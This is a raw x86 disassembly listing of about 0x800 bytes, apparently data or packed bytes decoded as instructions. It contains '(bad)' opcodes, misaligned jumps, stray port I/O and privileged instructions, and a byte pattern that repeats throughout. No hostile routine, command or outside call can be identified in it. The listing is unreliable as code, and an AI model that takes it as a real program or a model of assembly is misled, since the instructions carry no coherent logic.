  415e00:	in     eax,dx
  415e01:	pop    eax
  415e02:	mov    cl,0x34
  415e04:	std    
  415e05:	add    eax,0x62412559
  415e0a:	inc    ebx
  415e0b:	add    BYTE PTR [eax],dl
  415e0d:	inc    eax
  415e0e:	add    BYTE PTR ds:0x62410040,al
  415e14:	inc    eax
  415e15:	add    BYTE PTR [ebx-0x34],al
  415e18:	inc    eax
  415e19:	add    eax,0x78434040
  415e1e:	bound  eax,QWORD PTR [ecx+0x78]
  415e21:	add    eax,0x62404043
  415e26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e27:	sub    al,0x23
  415e29:	jnp    0x415e6b
  415e2b:	inc    ebp
  415e2c:	retf   
  415e2d:	inc    ecx
  415e2e:	mov    ch,BYTE PTR [edx+0x74]
  415e31:	test   al,0x79
  415e33:	test   al,0x70
  415e35:	inc    ebx
  415e36:	stos   BYTE PTR es:[edi],al
  415e37:	and    DWORD PTR [edx+0x11],0x30453fc3
  415e3e:	in     al,0x7a
  415e40:	sub    DWORD PTR [edi+0x4041174b],edi
  415e46:	add    eax,0x43436240
  415e4b:	add    eax,0x62004040
  415e50:	inc    eax
  415e51:	add    BYTE PTR [ecx+0x40],al
  415e54:	inc    ebx
  415e55:	test   BYTE PTR ds:0x58054041,ah
  415e5b:	inc    eax
  415e5c:	inc    eax
  415e5d:	bound  eax,QWORD PTR [eax+0x66]
  415e60:	inc    ecx
  415e61:	inc    eax
  415e62:	add    eax,0xe1a0fc00
  415e67:	add    DWORD PTR [ebx-0x41],edx
  415e6a:	popa   
  415e6b:	bound  edi,QWORD PTR [edi+eax*2-0x409ebcba]
  415e72:	push   esp
  415e73:	data16 adc BYTE PTR [ebp+0x2c7c80f9],al
  415e7a:	bound  edx,QWORD PTR [eax+0x349f43fc]
  415e80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e81:	int    0x34
  415e83:	bound  esp,QWORD PTR [eax+edx*4+0x2f]
  415e87:	dec    edi
  415e88:	add    BYTE PTR [eax],al
  415e8a:	inc    ebx
  415e8b:	inc    eax
  415e8c:	bound  eax,QWORD PTR ds:0x25404110
  415e92:	add    ah,cl
  415e94:	inc    ebx
  415e95:	add    eax,0x40402562
  415e9a:	add    BYTE PTR [eax+0x40],al
  415e9d:	inc    ecx
  415e9e:	inc    ecx
  415e9f:	add    eax,0x78434025
  415ea4:	bound  eax,QWORD PTR [eax-0x7c]
  415ea7:	inc    eax
  415ea8:	inc    ecx
  415ea9:	sub    eax,0xab5f40cd
  415eae:	mov    ds,eax
  415eb0:	add    BYTE PTR [esi-0x626bbc0],dh
  415eb6:	inc    ebx
  415eb7:	ja     0x415ee6
  415eb9:	pop    ecx
  415eba:	sub    bh,BYTE PTR [eax]
  415ebc:	cmp    DWORD PTR [ecx-0x2f],ebx
  415ebf:	dec    eax
  415ec0:	inc    ecx
  415ec1:	inc    eax
  415ec2:	inc    eax
  415ec3:	inc    ebx
  415ec4:	int3   
  415ec5:	add    BYTE PTR ds:0x56240,al
  415ecb:	inc    ebx
  415ecc:	inc    eax
  415ecd:	inc    eax
  415ece:	add    BYTE PTR [ecx+0x62],al
  415ed1:	bound  eax,QWORD PTR [eax]
  415ed3:	int3   
  415ed4:	inc    eax
  415ed5:	inc    ebx
  415ed6:	add    eax,0x43624041
  415edb:	adc    BYTE PTR [ecx+0x5],al
  415ede:	inc    eax
  415edf:	inc    eax
  415ee0:	sub    edx,DWORD PTR [eax+0x7d6263c3]
  415ee6:	jl     0x415f1c
  415ee8:	jnp    0x415ea9
  415eea:	dec    eax
  415eeb:	push   0x74
  415eed:	jg     0x415efe
  415eef:	xor    ah,BYTE PTR [ecx-0x53cafac0]
  415ef5:	and    BYTE PTR [edi],cl
  415ef7:	or     BYTE PTR [edx+0x40],bl
  415efa:	retf   
  415efb:	shl    ch,0xdf
  415efe:	xchg   ebx,eax
  415eff:	and    ecx,0xb8404541
  415f05:	bound  eax,QWORD PTR [ebx+0x40]
  415f08:	adc    BYTE PTR ds:0x4158cc40,al
  415f0e:	inc    ebx
  415f0f:	bound  eax,QWORD PTR [ecx+0x40]
  415f12:	add    eax,0x4140
  415f17:	and    eax,0x40400062
  415f1c:	add    eax,0x84404340
  415f21:	int3   
  415f22:	js     0x415f24
  415f24:	inc    ecx
  415f25:	adc    BYTE PTR [edx+0xf],ah
  415f28:	inc    ecx
  415f29:	aaa    
  415f2a:	popa   
  415f2b:	jbe    0x415f11
  415f2d:	aaa    
  415f2e:	inc    eax
  415f2f:	bound  eax,QWORD PTR [ebx-0x4]
  415f32:	add    BYTE PTR [edi-0x40],ah
  415f35:	js     0x415f7c
  415f37:	sbb    DWORD PTR [eax],esi
  415f39:	lock sub DWORD PTR [eax-0x35],edx
  415f3d:	bound  eax,QWORD PTR [ebx-0x68]
  415f40:	pushf  
  415f41:	cmc    
  415f42:	ins    DWORD PTR es:[edi],dx
  415f43:	in     eax,0xbf
  415f45:	test   eax,0x70c117aa
  415f4a:	add    dl,BYTE PTR [ebx-0x42]
  415f4d:	mov    ah,0x94
  415f4f:	or     al,0x73
  415f51:	pop    esp
  415f52:	sub    DWORD PTR [ecx-0x729dc94f],esp
  415f58:	push   es
  415f59:	(bad)  
  415f5a:	dec    ebx
  415f5b:	and    eax,0x4000ce11
  415f60:	inc    ecx
  415f61:	inc    eax
  415f62:	inc    ebx
  415f63:	bound  ax,DWORD PTR ds:0x40434100
  415f6a:	add    eax,0x40054062
  415f6f:	bound  eax,QWORD PTR [ecx+0x40]
  415f72:	inc    ebx
  415f73:	inc    eax
  415f74:	add    eax,0x25405841
  415f79:	bound  eax,QWORD PTR [eax+0x43]
  415f7c:	inc    eax
  415f7d:	adc    BYTE PTR [edx+eiz*2],dh
  415f80:	cmp    al,BYTE PTR gs:[eax]
  415f83:	mov    al,ds:0x70d248a8
  415f88:	dec    esp
  415f89:	mov    WORD PTR [esi],ss
  415f8b:	adc    cl,BYTE PTR es:[ebp+0x21]
  415f8f:	les    ecx,FWORD PTR [edi]
  415f91:	cmp    BYTE PTR [edx],ch
  415f93:	mov    esi,0x5db8a9e8
  415f98:	xor    eax,0x15370b42
  415f9d:	addr16 cmp eax,0x9e74a9a8
  415fa3:	arpl   bp,cx
  415fa5:	push   esp
  415fa6:	or     DWORD PTR [eax],esp
  415fa8:	stos   DWORD PTR es:[edi],eax
  415fa9:	mov    ebp,DWORD PTR [esi+0x42]
  415fac:	inc    eax
  415fad:	jnp    0x415f55
  415faf:	cmp    al,BYTE PTR [ebx-0x5b]
  415fb2:	inc    eax
  415fb3:	loop   0x415ff5
  415fb5:	inc    ecx
  415fb6:	inc    ebx
  415fb7:	inc    eax
  415fb8:	add    eax,0x43406262
  415fbd:	inc    ecx
  415fbe:	adc    BYTE PTR [eax],al
  415fc0:	inc    eax
  415fc1:	add    eax,0x43000562
  415fc6:	add    BYTE PTR [ecx+0x40],al
  415fc9:	inc    eax
  415fca:	add    eax,0x400062
  415fcf:	inc    ebx
  415fd0:	inc    eax
  415fd1:	js     0x416014
  415fd3:	inc    ecx
  415fd4:	bound  eax,QWORD PTR [eax+0x2a]
  415fd7:	frstor [edx-0x36]
  415fda:	sar    BYTE PTR ds:0x41403a00,cl
  415fe0:	jge    0x416002
  415fe2:	lock jle 0x416011
  415fe5:	sbb    ch,ah
  415fe7:	mov    ah,al
  415fe9:	push   0x625476d3
  415fee:	add    eax,0x55ac4f67
  415ff3:	les    eax,FWORD PTR [eax+0x41054062]
  415ff9:	add    BYTE PTR [ebx+0x40],al
  415ffc:	inc    eax
  415ffd:	inc    ecx
  415ffe:	inc    eax
  415fff:	inc    eax
  416000:	bound  eax,QWORD PTR ds:0x5624300
  416006:	add    BYTE PTR [eax+0x40],al
  416009:	add    BYTE PTR [ecx+0x43],al
  41600c:	add    BYTE PTR [eax+0x41],al
  41600f:	add    eax,0x40436200
  416014:	inc    eax
  416015:	add    eax,0x40861362
  41601a:	shl    BYTE PTR [edx-0x4c],0xef
  41601e:	pop    ss
  41601f:	or     DWORD PTR [ebx],esi
  416021:	inc    eax
  416022:	inc    eax
  416023:	jne    0x416066
  416025:	std    
  416026:	pop    ebx
  416027:	and    al,0xe4
  416029:	inc    eax
  41602a:	inc    eax
  41602b:	rol    BYTE PTR [ebx-0x55],1
  41602e:	mov    BYTE PTR [eax*1+0x30655a40],dh
  416035:	mov    bl,0x3
  416037:	sbb    eax,0x57b84886
  41603c:	cwde   
  41603d:	call   0x566c42c
  416042:	cmp    eax,0x44cd4794
  416047:	xchg   ebp,eax
  416048:	inc    ecx
  416049:	inc    eax
  41604a:	add    eax,0x41624340
  41604f:	test   BYTE PTR [eax],al
  416051:	and    eax,0x404043
  416056:	add    BYTE PTR ds:0x626210,al
  41605c:	add    eax,0x43404140
  416061:	inc    eax
  416062:	inc    ecx
  416063:	add    eax,0x10664062
  416068:	inc    ebx
  416069:	(bad)
  41606e:	test   DWORD PTR ds:0x44055b00,edi
  416074:	inc    edi
  416075:	stos   DWORD PTR es:[edi],eax
  416076:	inc    ebx
  416077:	inc    ebx
  416078:	sub    al,0xa3
  41607a:	xchg   BYTE PTR [ecx-0x3c],al
  41607d:	inc    eax
  41607e:	nop
  41607f:	ja     0x4160d5
  416081:	rdmsr  
  416083:	in     al,dx
  416084:	push   esp
  416085:	inc    eax
  416086:	dec    eax
  416087:	loope  0x41608a
  416089:	and    dl,ah
  41608b:	jecxz  0x4160f0
  41608d:	inc    eax
  41608e:	inc    ebx
  41608f:	fs addr16 pusha 
  416092:	add    eax,0x5c2a7a8
  416097:	int3   
  416098:	inc    ecx
  416099:	inc    eax
  41609a:	add    BYTE PTR [eax],al
  41609c:	add    BYTE PTR [eax+0x40],al
  41609f:	inc    ebx
  4160a0:	bound  eax,QWORD PTR [eax]
  4160a2:	inc    eax
  4160a3:	inc    eax
  4160a4:	add    eax,0x62434162
  4160a9:	inc    eax
  4160aa:	js     0x4160bc
  4160ac:	inc    ecx
  4160ad:	add    eax,0x5404325
  4160b2:	bound  eax,QWORD PTR [eax+0x40]
  4160b5:	inc    ecx
  4160b6:	inc    ebx
  4160b7:	shl    DWORD PTR [ebp+0x11865a01],1
  4160bd:	shr    BYTE PTR [ecx-0x54aaa6be],0x35
  4160c4:	dec    eax
  4160c5:	bound  eax,QWORD PTR [ecx+esi*1+0x1]
  4160c9:	add    DWORD PTR [esi-0x1f],eax
  4160cc:	or     eax,0xe79262c6
  4160d1:	inc    esp
  4160d2:	jecxz  0x4160d9
  4160d4:	inc    edx
  4160d5:	cmp    al,0xb8
  4160d7:	inc    ecx
  4160d8:	cmp    al,BYTE PTR [ecx+0x62412508]
  4160de:	inc    ebx
  4160df:	add    BYTE PTR [eax],dl
  4160e1:	inc    eax
  4160e2:	add    BYTE PTR ds:0x62410040,al
  4160e8:	inc    eax
  4160e9:	add    BYTE PTR [ebx-0x34],al
  4160ec:	inc    eax
  4160ed:	add    eax,0x78434040
  4160f2:	bound  eax,QWORD PTR [ecx+0x78]
  4160f5:	add    eax,0x62404043
  4160fa:	xchg   BYTE PTR [ecx+0x30],al
  4160fd:	fs inc ecx
  4160ff:	fisubr WORD PTR [eax+0x2b]
  416102:	sub    al,0x98
  416104:	repnz mov BYTE PTR [ebx-0x50],0x80
  416109:	adc    eax,esp
  41610b:	out    dx,eax
  41610c:	test   al,0xa8
  41610e:	xor    BYTE PTR [eax-0x57fa1cdc],dh
  416114:	adc    BYTE PTR [esi-0x6c],bl
  416117:	push   edi
  416118:	(bad)  
  416119:	sub    eax,0x40054041
  41611e:	bound  eax,QWORD PTR [ebx+0x43]
  416121:	add    eax,0x62004040
  416126:	inc    eax
  416127:	add    BYTE PTR [ecx+0x40],al
  41612a:	inc    ebx
  41612b:	test   BYTE PTR ds:0x58054041,ah
  416131:	inc    eax
  416132:	inc    eax
  416133:	bound  eax,QWORD PTR [eax+0x66]
  416136:	inc    ecx
  416137:	inc    eax
  416138:	add    eax,0x98108600
  41613d:	es inc edi
  41613f:	stos   DWORD PTR es:[edi],eax
  416140:	dec    eax
  416141:	popa   
  416142:	sub    DWORD PTR [eax+0x5],edx
  416145:	push   ebx
  416146:	test   DWORD PTR [edx+0x2df9f81],ebp
  41614c:	retf   
  41614d:	xor    eax,0x40430000
  416152:	bound  eax,QWORD PTR ds:0x25404110
  416158:	add    ah,cl
  41615a:	inc    ebx
  41615b:	add    eax,0x40402562
  416160:	add    BYTE PTR [eax+0x40],al
  416163:	inc    ecx
  416164:	inc    ecx
  416165:	add    eax,0x78434025
  41616a:	bound  eax,QWORD PTR [eax-0x7c]
  41616d:	inc    eax
  41616e:	inc    ecx
  41616f:	inc    ebx
  416170:	lea    esi,[esi]
  416172:	jo     0x416179
  416174:	retf   
  416175:	adc    al,BYTE PTR [eax-0x70]
  416178:	inc    BYTE PTR [edx]
  41617a:	and    DWORD PTR [esi+0x6548a048],eax
  416180:	jge    0x4161a3
  416182:	cmp    DWORD PTR [ecx],esp
  416184:	adc    eax,0xb4433d46
  416189:	pusha  
  41618a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41618b:	fiadd  WORD PTR [ebp-0x42]
  41618e:	inc    edx
  41618f:	sar    esi,1
  416191:	pop    ecx
  416192:	sub    BYTE PTR ds:0x957d2c41,al
  416198:	push   esi
  416199:	inc    ecx
  41619a:	inc    eax
  41619b:	inc    eax
  41619c:	inc    ebx
  41619d:	int3   
  41619e:	add    BYTE PTR ds:0x56240,al
  4161a4:	inc    ebx
  4161a5:	inc    eax
  4161a6:	inc    eax
  4161a7:	add    BYTE PTR [ecx+0x62],al
  4161aa:	bound  eax,QWORD PTR [eax]
  4161ac:	int3   
  4161ad:	inc    eax
  4161ae:	inc    ebx
  4161af:	add    eax,0x43624041
  4161b4:	adc    BYTE PTR [ecx+0x5],al
  4161b7:	inc    eax
  4161b8:	addr16 pop eax
  4161ba:	xchg   BYTE PTR [eax-0x3f92c762],bl
  4161c0:	ret    0x26a3
  4161c3:	(bad)  
  4161c4:	cmp    al,0xd9
  4161c6:	pop    es
  4161c7:	in     eax,0xa0
  4161c9:	popa   
  4161ca:	(bad)  [eax+0x1d0aa962]
  4161d0:	dec    eax
  4161d1:	add    eax,DWORD PTR ds:0x41b41011
  4161d7:	pop    edx
  4161d8:	rcr    BYTE PTR [edx-0x7a],0x44
  4161dc:	xchg   esp,eax
  4161dd:	ins    BYTE PTR es:[edi],dx
  4161de:	inc    ebx
  4161df:	repz test DWORD PTR [edx+0x43],esp
  4161e3:	inc    eax
  4161e4:	adc    BYTE PTR ds:0x4158cc40,al
  4161ea:	inc    ebx
  4161eb:	bound  eax,QWORD PTR [ecx+0x40]
  4161ee:	add    eax,0x4140
  4161f3:	and    eax,0x40400062
  4161f8:	add    eax,0x84404340
  4161fd:	int3   
  4161fe:	js     0x416200
  416200:	inc    ecx
  416201:	adc    BYTE PTR [edx+0xf],ah
  416204:	test   DWORD PTR [eax+ecx*1],ebp
  416207:	daa    
  416208:	jg     0x41623a
  41620a:	fwait
  41620b:	js     0x4161f2
  41620d:	fmul   st(3),st
  41620f:	sbb    ah,BYTE PTR [edx-0x70]
  416212:	adc    eax,0x48051340
  416217:	bound  ecx,QWORD PTR [edx+0x47]
  41621a:	inc    eax
  41621b:	je     0x41620d
  41621d:	xchg   BYTE PTR ds:0xdd853015,al
  416223:	add    BYTE PTR [eax+0x41],al
  416226:	inc    eax
  416227:	inc    ebx
  416228:	bound  ax,DWORD PTR ds:0x40434100
  41622f:	add    eax,0x40054062
  416234:	bound  eax,QWORD PTR [ecx+0x40]
  416237:	inc    ebx
  416238:	inc    eax
  416239:	add    eax,0x25405841
  41623e:	bound  eax,QWORD PTR [eax+0x43]
  416241:	inc    eax
  416242:	adc    BYTE PTR [eax-0x77],al
  416245:	sub    al,0x45
  416247:	int    0x1a
  416249:	inc    ebx
  41624a:	fwait
  41624b:	jo     0x4161ec
  41624d:	fild   DWORD PTR [ecx+0x24]
  416250:	pushf  
  416251:	nop
  416252:	fld    QWORD PTR [eax+0x12]
  416255:	add    eax,0x2545698
  41625a:	int3   
  41625b:	jb     0x416262
  41625d:	xchg   BYTE PTR [ebp+0xe435162],cl
  416263:	inc    eax
  416264:	push   edi
  416265:	and    DWORD PTR [eax-0x182e221c],ebp
  41626b:	inc    eax
  41626c:	add    DWORD PTR [eax+0x41],eax
  41626f:	inc    ebx
  416270:	inc    eax
  416271:	add    eax,0x43406262
  416276:	inc    ecx
  416277:	adc    BYTE PTR [eax],al
  416279:	inc    eax
  41627a:	add    eax,0x43000562
  41627f:	add    BYTE PTR [ecx+0x40],al
  416282:	inc    eax
  416283:	add    eax,0x400062
  416288:	inc    ebx
  416289:	inc    eax
  41628a:	js     0x4162cd
  41628c:	inc    ecx
  41628d:	bound  eax,QWORD PTR [eax-0x26]
  416290:	adc    bh,BYTE PTR [eax+0x40]
  416293:	loopne 0x4162c3
  416295:	ins    DWORD PTR es:[edi],dx
  416296:	or     al,BYTE PTR ds:0xb5ac6258
  41629c:	xor    BYTE PTR [ebx-0x75ee79ff],al
  4162a2:	push   eax
  4162a3:	xchg   ebx,eax
  4162a4:	inc    ebx
  4162a5:	shr    ah,0x25
  4162a8:	retf   
  4162a9:	and    BYTE PTR [ecx+esi*2],bh
  4162ac:	mov    ebx,0x48d98513
  4162b1:	pop    ebx
  4162b2:	repz inc ecx
  4162b4:	out    0x40,eax
  4162b6:	hlt    
  4162b7:	add    eax,0x43cc800d
  4162bc:	inc    ebp
  4162bd:	adc    al,BYTE PTR [esi+0x64674586]
  4162c3:	xor    BYTE PTR [edx+0x4b],dl
  4162c6:	bound  eax,QWORD PTR [eax+0x5]
  4162c9:	inc    ecx
  4162ca:	add    BYTE PTR [ebx+0x40],al
  4162cd:	inc    eax
  4162ce:	inc    ecx
  4162cf:	inc    eax
  4162d0:	inc    eax
  4162d1:	bound  eax,QWORD PTR ds:0x5624300
  4162d7:	add    BYTE PTR [eax+0x40],al
  4162da:	add    BYTE PTR [ecx+0x43],al
  4162dd:	add    BYTE PTR [eax+0x41],al
  4162e0:	add    eax,0x40436200
  4162e5:	inc    eax
  4162e6:	add    eax,0x41322162
  4162eb:	cmc    
  4162ec:	data16 or dl,0xc1
  4162f0:	dec    esi
  4162f1:	fcomp  DWORD PTR [eax+0x564740f4]
  4162f7:	push   0x669c0501
  4162fc:	test   WORD PTR [esi],bp
  4162ff:	ret    0x8642
  416302:	test   al,0xad
  416304:	xchg   ecx,eax
  416305:	inc    ebx
  416306:	and    BYTE PTR [ecx],ah
  416308:	test   BYTE PTR [edi],ch
  41630a:	adc    BYTE PTR [eax],bh
  41630c:	mov    edi,0x40418090
  416311:	add    eax,0x41624340
  416316:	test   BYTE PTR [eax],al
  416318:	and    eax,0x404043
  41631d:	add    BYTE PTR ds:0x626210,al
  416323:	add    eax,0x43404140
  416328:	inc    eax
  416329:	inc    ecx
  41632a:	add    eax,0x10664062
  41632f:	inc    ebx
  416330:	bound  eax,QWORD PTR [esi]
  416332:	mov    ebx,0x6c4564d7
  416337:	pop    ds
  416338:	xchg   ebx,eax
  416339:	adc    DWORD PTR [ebp+eax*1+0x4346d802],esp
  416340:	inc    ecx
  416341:	ret    0x86a5
  416344:	inc    edx
  416345:	out    dx,al
  416346:	(bad)  
  416347:	rcl    DWORD PTR [ebx],1
  416349:	sub    DWORD PTR [ebp-0x30f4d9d2],eax
  41634f:	mov    eax,ds:0xd63c6724
  416354:	nop
  416355:	imul   ebp,DWORD PTR [eax+0x4041cc05],0x40000000
  41635f:	inc    eax
  416360:	inc    ebx
  416361:	bound  eax,QWORD PTR [eax]
  416363:	inc    eax
  416364:	inc    eax
  416365:	add    eax,0x62434162
  41636a:	inc    eax
  41636b:	js     0x41637d
  41636d:	inc    ecx
  41636e:	add    eax,0x5404325
  416373:	bound  eax,QWORD PTR [eax+0x40]
  416376:	inc    ecx
  416377:	inc    ebx
  416378:	push   edi
  41637a:	ret    
  41637b:	add    BYTE PTR ds:0x62106262,0x2c
  416382:	push   esp
  416383:	sub    al,0x86
  416385:	inc    esp
  416386:	push   eax
  416387:	cwde   
  416388:	adc    esp,DWORD PTR [esi-0x3f]
  41638b:	push   ebp
  41638c:	daa    
  41638d:	push   edi
  41638e:	pop    ebp
  41638f:	inc    ecx
  416390:	inc    ecx
  416391:	ds fs add dl,ch
  416395:	cmp    ebp,ecx
  416397:	rol    BYTE PTR [ebx-0x36],0xc4
  41639b:	ss add eax,0x30286b3a
  4163a1:	inc    ebx
  4163a2:	xor    BYTE PTR [ebp-0x7a],ah
  4163a5:	stos   DWORD PTR es:[edi],eax
  4163a6:	sbb    BYTE PTR [esp+edi*8+0x55],bl
  4163aa:	dec    ecx
  4163ab:	or     DWORD PTR [ecx],ebp
  4163ad:	and    eax,0x436241
  4163b2:	adc    BYTE PTR [eax+0x0],al
  4163b5:	add    eax,0x62410040
  4163ba:	inc    eax
  4163bb:	add    BYTE PTR [ebx-0x34],al
  4163be:	inc    eax
  4163bf:	add    eax,0x78434040
  4163c4:	bound  eax,QWORD PTR [ecx+0x78]
  4163c7:	add    eax,0x62404043
  4163cc:	test   al,0x49
  4163ce:	sub    al,BYTE PTR [edi-0x66]
  4163d1:	ror    BYTE PTR [ebp-0x2c],0x11
  4163d5:	push   esi
  4163d6:	push   ecx
  4163d7:	test   DWORD PTR [esi+0x5c050232],ebp
  4163dd:	pop    ebp
  4163de:	leave  
  4163df:	inc    ebx
  4163e0:	dec    eax
  4163e1:	cli    
  4163e2:	sub    eax,DWORD PTR [esi-0x6f5303f8]
  4163e8:	lds    edx,FWORD PTR [eax+0x37]
  4163eb:	pusha  
  4163ec:	inc    ebx
  4163ed:	repz inc edx
  4163ef:	cmp    al,0x4f
  4163f1:	rcl    BYTE PTR [ebx+edx*8+0x20],0xf0
  4163f6:	fld    DWORD PTR [ebx-0x80]
  4163f9:	das    
  4163fa:	add    DWORD PTR ds:0xd10062a0,eax
  416400:	cs push eax
  416402:	inc    ecx
  416403:	inc    eax
  416404:	add    eax,0x43436240
  416409:	add    eax,0x62004040
  41640e:	inc    eax
  41640f:	add    BYTE PTR [ecx+0x40],al
  416412:	inc    ebx
  416413:	test   BYTE PTR ds:0x58054041,ah
  416419:	inc    eax
  41641a:	inc    eax
  41641b:	bound  eax,QWORD PTR [eax+0x66]
  41641e:	inc    ecx
  41641f:	inc    eax
  416420:	add    eax,0x62867600
  416425:	int    0x62
  416427:	test   BYTE PTR [ecx+0x1e3901c0],ch
  41642d:	mov    esp,0x3023f4cb
  416432:	dec    eax
  416433:	shl    BYTE PTR [esi],cl
  416435:	gs dec eax
  416437:	jmp    0x5c2e30e
  41643c:	xchg   ebp,eax
  41643d:	inc    eax
  41643e:	xor    al,0xd
  416440:	add    al,al
  416442:	push   edi
  416443:	xchg   BYTE PTR [eax],al
  416445:	add    BYTE PTR [ebx+0x40],al
  416448:	bound  eax,QWORD PTR ds:0x25404110
  41644e:	add    ah,cl
  416450:	inc    ebx
  416451:	add    eax,0x40402562
  416456:	add    BYTE PTR [eax+0x40],al
  416459:	inc    ecx
  41645a:	inc    ecx
  41645b:	add    eax,0x78434025
  416460:	bound  eax,QWORD PTR [eax-0x7c]
  416463:	inc    eax
  416464:	inc    ecx
  416465:	bound  edi,QWORD PTR [eax+eax*2]
  416468:	inc    ecx
  416469:	add    al,0x32
  41646b:	add    DWORD PTR [ebx],esp
  41646d:	cmp    ebp,edx
  41646f:	push   eax
  416470:	inc    ebx
  416471:	rcl    ah,cl
  416473:	leave  
  416474:	sar    esp,1
  416476:	bound  eax,QWORD PTR [edx+0x30]
  416479:	fcmovb st,st(1)
  41647b:	add    DWORD PTR ds:0x841d076e,0x4041d020
  416485:	inc    eax
  416486:	inc    ebx
  416487:	int3   
  416488:	add    BYTE PTR ds:0x56240,al
  41648e:	inc    ebx
  41648f:	inc    eax
  416490:	inc    eax
  416491:	add    BYTE PTR [ecx+0x62],al
  416494:	bound  eax,QWORD PTR [eax]
  416496:	int3   
  416497:	inc    eax
  416498:	inc    ebx
  416499:	add    eax,0x43624041
  41649e:	adc    BYTE PTR [ecx+0x5],al
  4164a1:	inc    eax
  4164a2:	push   cs
  4164a3:	xchg   BYTE PTR [ecx+0x4e47f0d0],dl
  4164a9:	ret    0x2907
  4164ac:	pop    eax
  4164ad:	arpl   WORD PTR [edx-0x7b],sp
  4164b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164b1:	jmp    0x4164d5
  4164b3:	shr    BYTE PTR [ecx],1
  4164b5:	popf   
  4164b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164b7:	inc    ebx
  4164b8:	fbld   TBYTE PTR [eax-0x7f]
  4164bb:	add    eax,0x9004c5c0
  4164c0:	adc    al,0x30
  4164c2:	aas    
  4164c3:	bound  eax,QWORD PTR [ebx+0x40]
  4164c6:	adc    BYTE PTR ds:0x4158cc40,al
  4164cc:	inc    ebx
  4164cd:	bound  eax,QWORD PTR [ecx+0x40]
  4164d0:	add    eax,0x4140
  4164d5:	and    eax,0x40400062
  4164da:	add    eax,0x84404340
  4164df:	int3   
  4164e0:	js     0x4164e2
  4164e2:	inc    ecx
  4164e3:	adc    BYTE PTR [edx+0xf],ah
  4164e6:	xchg   al,cl
  4164e8:	cmp    al,0xcd
  4164ea:	fld    DWORD PTR [eax+0x4f2c7cc2]
  4164f0:	mov    dh,0x63
  4164f2:	inc    ebx
  4164f3:	push   ds
  4164f4:	xor    BYTE PTR [ecx],al
  4164f6:	sub    ebp,DWORD PTR [edx]
  4164f8:	dec    esp
  4164f9:	dec    eax
  4164fa:	shr    DWORD PTR [edx+0x74400a4d],1
  416500:	inc    edi
  416501:	mul    BYTE PTR [ebp+0x26]
  416504:	rol    DWORD PTR [eax],0x40
  416507:	inc    ecx
  416508:	inc    eax
  416509:	inc    ebx
  41650a:	bound  ax,DWORD PTR ds:0x40434100
  416511:	add    eax,0x40054062
  416516:	bound  eax,QWORD PTR [ecx+0x40]
  416519:	inc    ebx
  41651a:	inc    eax
  41651b:	add    eax,0x25405841
  416520:	bound  eax,QWORD PTR [eax+0x43]
  416523:	inc    eax
  416524:	adc    BYTE PTR [edi],al
  416526:	dec    edx
  416527:	test   al,0xc9
  416529:	int    0x59
  41652b:	clc    
  41652c:	inc    ecx
  41652d:	push   edi
  41652e:	int3   
  41652f:	cs out dx,eax
  416531:	jne    0x416524
  416533:	adc    eax,eax
  416535:	add    edx,DWORD PTR [edx+0x2e]
  416538:	test   al,0x35
  41653a:	sbb    al,al
  41653c:	daa    
  41653d:	ror    esi,cl
  41653f:	lods   al,BYTE PTR ds:[esi]
  416540:	adc    DWORD PTR [ecx],ebp
  416542:	inc    ecx
  416543:	mov    eax,ds:0x41408240
  416548:	inc    ebx
  416549:	inc    eax
  41654a:	add    eax,0x43406262
  41654f:	inc    ecx
  416550:	adc    BYTE PTR [eax],al
  416552:	inc    eax
  416553:	add    eax,0x43000562
  416558:	add    BYTE PTR [ecx+0x40],al
  41655b:	inc    eax
  41655c:	add    eax,0x400062
  416561:	inc    ebx
  416562:	inc    eax
  416563:	js     0x4165a6
  416565:	inc    ecx
  416566:	bound  eax,QWORD PTR [eax+0x5]
  416569:	retf   
  41656a:	dec    eax
  41656b:	cs inc ebx
  41656d:	ins    DWORD PTR es:[edi],dx
  41656e:	test   eax,0x411586b6
  416573:	pop    eax
  416574:	xor    BYTE PTR ds:0x4130c718,dl
  41657a:	inc    edi
  41657b:	fs clc 
  41657d:	bound  eax,QWORD PTR [esi+eax*4-0x33]
  416581:	ret    
  416582:	fdivr  st,st(1)
  416584:	dec    esi
  416585:	cmp    al,0xc0
  416587:	das    
  416588:	add    eax,0x8d624c4e
  41658d:	push   0x540622f
  416592:	inc    ecx
  416593:	add    BYTE PTR [ebx+0x40],al
  416596:	inc    eax
  416597:	inc    ecx
  416598:	inc    eax
  416599:	inc    eax
  41659a:	bound  eax,QWORD PTR ds:0x5624300
  4165a0:	add    BYTE PTR [eax+0x40],al
  4165a3:	add    BYTE PTR [ecx+0x43],al
  4165a6:	add    BYTE PTR [eax+0x41],al
  4165a9:	add    eax,0x40436200
  4165ae:	inc    eax
  4165af:	add    eax,0x28865162
  4165b4:	add    eax,0x480543f4
  4165b9:	add    esi,DWORD PTR [ebx]
  4165bb:	add    al,BYTE PTR [bx+di-0x5070]
  4165c0:	shl    BYTE PTR [ebp-0x57696f34],0xf6
  4165c7:	push   eax
  4165c8:	xor    ch,dl
  4165ca:	add    eax,0x43bf6224
  4165cf:	outs   dx,BYTE PTR ds:[esi]
  4165d0:	outs   dx,BYTE PTR ds:[esi]
  4165d1:	add    BYTE PTR [esi-0x2ed54054],0x90
  4165d8:	ret    
  4165d9:	inc    ecx
  4165da:	inc    eax
  4165db:	add    eax,0x41624340
  4165e0:	test   BYTE PTR [eax],al
  4165e2:	and    eax,0x404043
  4165e7:	add    BYTE PTR ds:0x626210,al
  4165ed:	add    eax,0x43404140
  4165f2:	inc    eax
  4165f3:	inc    ecx
  4165f4:	add    eax,0x10664062
  4165f9:	inc    ebx
  4165fa:	bound  ebp,QWORD PTR [esi*1-0x50ef56fb]
  416601:	inc    edx
  416602:	dec    BYTE PTR [ebx+ecx*8+0x41]
  416606:	mov    al,0x48
  416608:	xchg   DWORD PTR ds:0x8e0505c1,esp
  41660e:	pop    DWORD PTR [edx+ebp*4+0x7c]
  416612:	or     edx,DWORD PTR [edx-0x7a]
  416615:	js     0x41663a
  416617:	pop    eax
  416618:	xor    al,0xc7
  41661a:	xlat   BYTE PTR ds:[ebx]
  41661b:	xchg   BYTE PTR [eax+ebp*4],dh
  41661e:	(bad)  [eax]
  416620:	inc    ecx
  416621:	scas   al,BYTE PTR es:[edi]
  416622:	jle    0x41665e
